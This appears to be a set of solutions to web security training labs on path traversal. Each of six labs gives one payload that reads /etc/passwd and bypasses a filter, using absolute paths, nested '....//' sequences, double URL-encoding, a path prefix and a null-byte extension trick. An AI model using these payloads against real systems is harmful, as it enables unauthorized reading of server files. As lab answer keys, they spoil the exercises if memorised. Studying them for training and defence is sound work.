# Path Traversal Labs

## Lab: File path traversal, simple case

### Exploitation

```text
../../../../etc/passwd
```

---

## Lab: File path traversal, traversal sequences blocked with absolute path bypass

### Exploitation

```text
/etc/passwd
```

---

## Lab: File path traversal, traversal sequences stripped non-recursively

### Exploitation

```text
....//....//....//.././etc/passwd
```

---

## Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

### Exploitation

```text
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

---

## Lab: File path traversal, validation of start of path

### Exploitation

```text
/var/www/images/../../../../../etc/passwd
```

---

## Lab: File path traversal, validation of file extension with null byte bypass

### Exploitation

```text
../../../etc/passwd%00.png
```